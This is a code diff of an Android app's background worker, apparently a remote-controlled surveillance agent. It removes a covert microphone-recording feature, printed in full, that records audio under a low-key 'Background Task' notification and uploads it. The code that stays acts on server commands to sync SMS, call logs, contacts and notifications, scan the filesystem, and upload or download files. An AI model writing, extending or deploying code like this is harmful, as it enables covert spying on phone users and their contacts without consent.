@@ -3,16 +3,11 @@ package com.elfinsaddle.worker
 import android.Manifest
 import android.content.Context
 import android.content.pm.PackageManager
-import android.content.pm.ServiceInfo
 import android.location.Location
-import android.media.MediaRecorder
-import android.os.Build
 import android.util.Log
-import androidx.core.app.NotificationCompat
 import androidx.core.content.ContextCompat
 import androidx.work.*
 import com.elfinsaddle.MainApplication
-import com.elfinsaddle.R
 import com.elfinsaddle.data.remote.ApiClient
 import com.elfinsaddle.data.remote.NetworkResult
 import com.elfinsaddle.data.repository.DeviceRepository
@@ -21,38 +16,30 @@ import com.elfinsaddle.util.SystemInfoManager
 import com.google.android.gms.location.LocationServices
 import com.google.android.gms.location.Priority
 import kotlinx.coroutines.Dispatchers
-import kotlinx.coroutines.delay
 import kotlinx.coroutines.tasks.await
 import kotlinx.coroutines.withContext
 import java.io.File
-import java.io.IOException
 
 class DataFetchWorker(
     appContext: Context,
     workerParams: WorkerParameters
 ) : CoroutineWorker(appContext, workerParams) {
 
-    // ▼▼▼ THESE PROPERTIES WERE MISSING IN THE PREVIOUS INCOMPLETE FILE ▼▼▼
     private val container = (applicationContext as MainApplication).container
     private val apiClient: ApiClient = container.apiClient
     private val systemInfoManager: SystemInfoManager = container.systemInfoManager
     private val fileSystemManager: FileSystemManager = container.fileSystemManager
     private val deviceRepository: DeviceRepository = container.deviceRepository
-    // ▲▲▲
 
     companion object {
         private const val TAG = "DataFetchWorker"
-        private const val FOREGROUND_NOTIFICATION_ID = 3
-        private const val RECORDING_DURATION_MS = 10_000L // 10 seconds
 
         const val KEY_COMMAND = "command"
         const val KEY_FILE_PATH = "filePath"
         const val KEY_IS_SILENT = "silent"
 
         // Commands
-        const val COMMAND_RECORD_AUDIO = "record_audio"
-        const val COMMAND_UPLOAD_AUDIO_RECORDING = "upload_audio_recording"
-
+        // REMOVED: COMMAND_RECORD_AUDIO, COMMAND_UPLOAD_AUDIO_RECORDING
         const val COMMAND_SYNC_ALL = "sync_all"
         const val COMMAND_SYNC_NOTIFICATIONS = "sync_notifications"
         const val COMMAND_SCAN_FILESYSTEM = "scan_filesystem"
@@ -70,13 +57,9 @@ class DataFetchWorker(
                 .setInputData(dataBuilder.build())
                 .setConstraints(Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build())
 
-            if (command == COMMAND_RECORD_AUDIO) {
-                workRequestBuilder.setExpedited(OutOfQuotaPolicy.RUN_AS_NON_EXPEDITED_WORK_REQUEST)
-                Log.d(TAG, "Scheduling EXPEDITED work for command: $command")
-            } else {
-                Log.d(TAG, "Scheduling regular work for command: $command")
-            }
-
+            // REMOVED: Special expedited work for audio recording
+            Log.d(TAG, "Scheduling regular work for command: $command")
+            
             WorkManager.getInstance(context).enqueue(workRequestBuilder.build())
         }
     }
@@ -88,11 +71,8 @@ class DataFetchWorker(
         }
 
         Log.i(TAG, "Worker starting for command: $command")
-
-        // Special handling for foreground task
-        if (command == COMMAND_RECORD_AUDIO) {
-            return recordAndUploadAudio()
-        }
+        
+        // REMOVED: Special handling for foreground task
 
         return withContext(Dispatchers.IO) {
             try {
@@ -115,7 +95,7 @@ class DataFetchWorker(
             COMMAND_UPLOAD_FILE -> uploadRequestedFile()
             COMMAND_DOWNLOAD_FILE -> downloadFileFromServer()
             COMMAND_PING -> sendPingResponse()
-            COMMAND_UPLOAD_AUDIO_RECORDING -> uploadAudioRecording()
+            // REMOVED: COMMAND_UPLOAD_AUDIO_RECORDING case
             else -> {
                 Log.w(TAG, "Unknown command received: $command")
                 false
@@ -123,78 +103,8 @@ class DataFetchWorker(
         }
     }
 
-    private suspend fun recordAndUploadAudio(): Result {
-        if (!hasPermission(Manifest.permission.RECORD_AUDIO)) {
-            Log.e(TAG, "Cannot record audio, permission missing.")
-            return Result.failure()
-        }
-
-        val recordingFile = File(applicationContext.cacheDir, "recording_${System.currentTimeMillis()}.amr")
-        var mediaRecorder: MediaRecorder? = null
-
-        try {
-            val foregroundInfo = createForegroundInfo()
-            setForeground(foregroundInfo)
-
-            mediaRecorder = (if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
-                MediaRecorder(applicationContext)
-            } else {
-                @Suppress("DEPRECATION")
-                MediaRecorder()
-            }).apply {
-                setAudioSource(MediaRecorder.AudioSource.MIC)
-                setOutputFormat(MediaRecorder.OutputFormat.AMR_NB)
-                setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
-                setOutputFile(recordingFile.absolutePath)
-                prepare()
-                start()
-            }
-            Log.i(TAG, "Recording started, saving to ${recordingFile.absolutePath}")
-
-            delay(RECORDING_DURATION_MS)
-
-        } catch (e: Exception) {
-            Log.e(TAG, "Recording failed during setup or execution", e)
-            return Result.failure()
-        } finally {
-            try {
-                mediaRecorder?.apply {
-                    stop()
-                    release()
-                }
-                Log.i(TAG, "Recording stopped.")
-            } catch (e: Exception) {
-                Log.e(TAG, "Error stopping media recorder, file might be corrupt.", e)
-            }
-        }
-
-        if (recordingFile.exists() && recordingFile.length() > 0) {
-            Log.d(TAG, "Uploading recorded file: ${recordingFile.name}")
-            val result = apiClient.uploadAudioRecording(recordingFile, systemInfoManager.getDeviceId())
-            recordingFile.delete()
-            return if (result is NetworkResult.Success<*>) Result.success() else Result.retry()
-        } else {
-            Log.w(TAG, "Recording file is empty or does not exist. No upload performed.")
-            return Result.failure()
-        }
-    }
-
-    private fun createForegroundInfo(): ForegroundInfo {
-        val notification = NotificationCompat.Builder(applicationContext, MainApplication.AUDIO_RECORDING_CHANNEL_ID)
-            .setContentTitle("Background Task")
-            .setContentText("Recording audio...")
-            .setSmallIcon(R.drawable.ic_recording_dot)
-            .setPriority(NotificationCompat.PRIORITY_LOW)
-            .build()
-
-        val foregroundServiceType = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-            ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
-        } else {
-            0
-        }
-
-        return ForegroundInfo(FOREGROUND_NOTIFICATION_ID, notification, foregroundServiceType)
-    }
+    // REMOVED: recordAndUploadAudio() method
+    // REMOVED: createForegroundInfo() method
 
     private suspend fun syncAllData(): Boolean {
         Log.i(TAG, "Starting full differential data sync...")
@@ -204,29 +114,8 @@ class DataFetchWorker(
         val notificationsSuccess = deviceRepository.syncNotifications() is NetworkResult.Success<*>
         return smsSuccess && callLogSuccess && contactsSuccess && notificationsSuccess
     }
-
-    private suspend fun uploadAudioRecording(): Boolean {
-        val filePath = inputData.getString(KEY_FILE_PATH) ?: run {
-            Log.e(TAG, "Audio upload failed: file path not provided.")
-            return true
-        }
-        val file = File(filePath)
-        if (!file.exists()) {
-            Log.e(TAG, "Audio upload failed: file does not exist at path $filePath")
-            return true
-        }
-
-        Log.d(TAG, "Uploading audio recording from: $filePath")
-        val result = apiClient.uploadAudioRecording(file, systemInfoManager.getDeviceId())
-
-        if (result is NetworkResult.Success<*>) {
-            Log.i(TAG, "Successfully uploaded audio recording. Deleting local file.")
-            file.delete()
-        } else {
-            Log.e(TAG, "Failed to upload audio recording. The file will be kept for the next retry.")
-        }
-        return result is NetworkResult.Success<*>
-    }
+    
+    // REMOVED: uploadAudioRecording() method
 
     private suspend fun uploadRequestedFile(): Boolean {
         val filePath = inputData.getString("filePath") ?: return false
@@ -239,8 +128,6 @@ class DataFetchWorker(
         val result = apiClient.uploadRequestedFile(file, deviceId, filePath)
         return result is NetworkResult.Success<*>
     }
-
-
 
     private suspend fun downloadFileFromServer(): Boolean {
         val serverFilePath = inputData.getString("serverFilePath") ?: return false
